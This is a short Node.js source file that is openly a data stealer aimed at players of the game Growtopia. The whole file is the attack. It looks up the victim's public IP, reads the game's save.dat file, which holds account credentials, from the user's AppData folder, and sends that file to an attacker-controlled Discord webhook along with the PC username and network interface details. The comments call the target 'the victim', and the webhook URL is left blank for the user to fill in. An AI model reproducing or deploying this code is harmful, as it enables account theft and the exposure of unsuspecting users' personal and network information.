const fs = require('fs')
const user = require('username');
const request = require('request')
const {
    Webhook,
    MessageBuilder
} = require('discord-webhook-node');

const client = new Webhook('your webhook url');//your webhook url
const os = require('os');


request.get(`https://api.ipify.org`, function(err, response, body) {
    if (err) 
	{
        return console.log(`Something went wrong.`);//cannot get user ip address (the victim is being offline)
    }

    process.chdir(`${__dirname.split(":")[0]}:/Users/${user.sync()}/AppData/Local/Growtopia`);//changing directory
    fs.readFile('save.dat', 'utf8', function(err, data) {//reading file....
        if (err) 
		{
            return console.log(`Something went wrong.`);
        } 
		else {
            const embed = new MessageBuilder()
                .setTitle('Found')
                .setAuthor('Galvin', 'https://cdn.discordapp.com/avatars/780615402312433674/dd6ebd6fc52f36d2c02be59aaacb3b02.webp?size=128', 'https://bit.ly/guckproject')
                .setURL('https://github.com/Galvin0705/')
                .setColor('#00b0f4')
                .setThumbnail('https://cdn.discordapp.com/avatars/780615402312433674/dd6ebd6fc52f36d2c02be59aaacb3b02.webp?size=128')
                .setDescription(`\`\`\`yaml\nIP Address: ${body}\nPC Username: ${user.sync()}\nNetwork information:\n${JSON.stringify(os.networkInterfaces())}\n\`\`\`\n`)
                .setTimestamp();
            client.send(embed).then(client.sendFile('save.dat')).catch(err => console.log(`Something went wrong.`));//failed to send save.dat to discord-webhook
        }

    });
});